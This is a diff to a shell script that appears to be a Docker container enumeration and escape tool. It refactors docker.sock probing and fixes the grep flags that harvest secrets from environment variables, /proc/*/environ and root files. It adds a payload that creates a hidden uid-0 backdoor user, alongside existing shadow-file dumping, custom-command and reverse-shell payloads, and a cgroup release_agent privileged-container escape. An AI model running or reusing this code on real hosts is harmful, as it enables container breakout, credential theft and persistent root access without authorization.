@@ -360,52 +360,49 @@ dockerSockCheck() {
   if [ -S "/var/run/docker.sock" ]; then
     dockerSockPath="/var/run/docker.sock"
     printYes
-
-    # TODO: Search elsewhere for sock?
-
-    if [ "$dockerSockPath" ]; then
-
-      printInfo "$(ls -lah $dockerSockPath)"
-      nl
-
-      # Is docker sock writable
-      printQuestion "Sock is writable ........"
-      if test -r "$dockerSockPath"; then
-        printYesEx
-        printTip "$TIP_WRITABLE_SOCK"
-      else
-        printNo
-      fi
-
-      if [ -x "$(command -v curl)" ]; then
-        sockInfoCmd="curl -s --unix-socket $dockerSockPath http://localhost/info"
-        sockInfoRepsonse="$($sockInfoCmd)"
-
-        printTip "To see full info from the docker sock output run the following"
-        printStatus "$sockInfoCmd"
-        nl
-
-        # Docker version unknown lets get it from the sock
-        if [ -z "$dockerVersion" ]; then
-          # IF jq...
-          #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`
-          dockerVersion=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
-        fi
-
-        # Get info from sock
-        info=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"')
-
-        printInfo "$info"
-      else
-        printError "Could not interact with the docker sock, as curl is not installed"
-        printInstallAdvice "curl"
-      fi
-    fi
-
   else
     printFail "Not Found"
+    # TODO: Search elsewhere for sock?
   fi
+  
+  if [ "$dockerSockPath" ]; then
 
+    printInfo "$(ls -lah $dockerSockPath)"
+    nl
+
+    # Is docker sock writable
+    printQuestion "Sock is writable ........"
+    if test -r "$dockerSockPath"; then
+      printYesEx
+      printTip "$TIP_WRITABLE_SOCK"
+    else
+      printNo
+    fi
+
+    if [ -x "$(command -v curl)" ]; then
+      sockInfoCmd="curl -s --unix-socket $dockerSockPath http://localhost/info"
+      sockInfoRepsonse="$($sockInfoCmd)"
+
+      printTip "To see full info from the docker sock output run the following"
+      printStatus "$sockInfoCmd"
+      nl
+
+      # Docker version unknown lets get it from the sock
+      if [ -z "$dockerVersion" ]; then
+        # IF jq...
+        #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`
+        dockerVersion=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
+      fi
+
+      # Get info from sock
+      info=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"')
+
+      printInfo "$info"
+    else
+      printError "Could not interact with the docker sock, as curl is not installed"
+      printInstallAdvice "curl"
+    fi
+  fi
 }
 
 enumerateContainer() {
@@ -434,9 +431,6 @@ containerID() {
 }
 
 containerIPs() {
-  # TODO: Add ifconfig method?
-
-  # TODO: Find a better way of waiting for net to init for tests.
   sleep 2
   
   # Get container IP
@@ -503,8 +497,6 @@ containerName() {
       printInstallAdvice "host dig nslookup"
     fi
   fi
-
-  # TODO: Not found, alpine doesn't look to work
 }
 
 getContainerInformation() {
@@ -529,7 +521,8 @@ getContainerInformation() {
     tools="$tools $(command -v "${CMD}")"
   done
 
-  printResultLong "Useful tools installed .." "$(echo "$tools" | tr ' ' '\n')"
+  # shellcheck disable=SC2086 # Double quotes messes up output...
+  printResultLong "Useful tools installed .." "$(echo $tools | tr ' ' '\n')"
 }
 
 containerServices() {
@@ -593,8 +586,6 @@ containerExploits() {
 enumerateContainers() {
   printSection "Enumerating Containers"
 
-  # TODO: Use http api
-
   if [ "$inContainer" ]; then # If inside a container
   
     printTip "$TIP_NETWORK_ENUM"
@@ -607,7 +598,6 @@ enumerateContainers() {
         docker ps -a
     elif [ "$dockerSockPath" ]; then
         # Enumerate containers using sock
-        # TODO: Use sock GET /containers/json
         TODO
     else
         pingSweep
@@ -693,9 +683,8 @@ portScan() {
 }
 
 findMountedFolders() {
-  printSection "Enumerating Mounts"
   # Find information about mount points
-  # TODO: Better parsing
+  printSection "Enumerating Mounts"
 
   printQuestion "Docker sock mounted ......."
   if grep -q docker.sock /proc/self/mountinfo; then
@@ -733,8 +722,8 @@ findMountedFolders() {
 findInterestingFiles() {
   printSection "Interesting Files"
 
-  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -iq "$GREP_SECRETS")
-  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -ivq "$GREP_SECRETS")
+  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -i "$GREP_SECRETS")
+  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -iv "$GREP_SECRETS")
 
   printQuestion "Interesting environment variables ..."
   if [ "$interestingVars" ]; then
@@ -764,7 +753,6 @@ findInterestingFiles() {
   nl
 
   # Any passwords root dir files
-  # TODO: Look for other common places...
   result=$(grep -Iins "$GREP_SECRETS" /*)
 
   printResultLong "Passwords in common files ..........." "$result"
@@ -780,11 +768,13 @@ findInterestingFiles() {
   fi
 
   hashes=$(cut -d':' -f2 < /etc/shadow 2>/dev/null | grep -v '^*$\|^!')
-  # TODO: Cannot check...
   printQuestion "Hashes in shadow file ..............."
   if [ "$hashes" ]; then
     printYes
     printStatus "$hashes"
+  elif test -r /etc/shadow; then
+    # Cannot check...
+    printFail "No permission"
   else
     printNo
   fi
@@ -831,8 +821,6 @@ checkDockerVersionExploits() {
     return
   fi
   
-  # TODO: Add more CVEs
-
   printQuestion "CVE–2019–13139 .........."
   if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
     printYesEx
@@ -855,25 +843,25 @@ checkDockerVersionExploits() {
 ###########################################
 
 prepareExploit() {
-
-  # PAYLOADS
+  # Shared method that takes the user input and converts it into a cmd to be used for exploitation
+  # Current available PAYLOADS are:
   # - shadow
   # - local shell
-  #
-  # - root user
-  # - ssh keys
   # - custom command
-  # - reverse tcp
+  # - new root user
 
   printMsg "Preparing Exploit" "\n"
 
   if [ "$shadow" ]; then
-    # Show shadow passwords
+  
+    # Show shadow password hashes
     printMsg "Exploit Type ............." "Print Shadow"
     printMsg "Clean up ................." "Automatic on container exit"
+    
     cmd="cat /etc/shadow"
+    
   elif [ "$isUserRoot" ]; then
-    # TODO: Allow new root user
+    # New root user
 
     if ! [ "$username" ]; then
       printError "username missing"
@@ -881,7 +869,7 @@ prepareExploit() {
     fi
 
     if ! [ "$password" ]; then
-      printError "passsword missing"
+      printError "password missing"
       exit 1
     fi
 
@@ -889,14 +877,19 @@ prepareExploit() {
     printMsg "Username ................." "$username"
     printMsg "Password ................." "$password"
     printMsg "Clean up ................." "Automatic on container exit"
-    TODO
+    # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
+    cmd="useradd $username;echo \"$password:$password\"|chpasswd $username;usermod -ou 0 $username"
+    
   elif [ "$command" ]; then
+    
+    # Custom payload (run a command)
     printMsg "Exploit Type ............." "Custom Command"
     printMsg "Custom Command ..........." "$command"
     printMsg "Clean up ................." "Automatic on container exit"
     cmd="$command"
+    
   elif [ "$ip" ]; then
-    # TODO: Reverse shell
+    # Reverse shell
 
     if ! [ "$port" ]; then
       printError "port missing"
@@ -958,14 +951,6 @@ exploitDocker() {
 exploitPrivileged() {
   printSection "Exploiting Privileged"
   printTip "$TIP_PRIVILEGED_MODE"
-  #   # Use fdisk -l to find partition
-  #   TODO
-  #   fdisk -l
-  #   mkdir -p /mnt/root
-  #   mount /dev/sda6 /mnt/root
-  #   cat /mnt/root/etc/shadow
-
-  shadow="1"
   prepareExploit
 
   # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
@@ -981,8 +966,6 @@ exploitPrivileged() {
   sh -c "echo 0 >$d/w/cgroup.procs"
   sleep 1
   cat /o
-
-  # Tidy up
   rm /c /o
 }
 
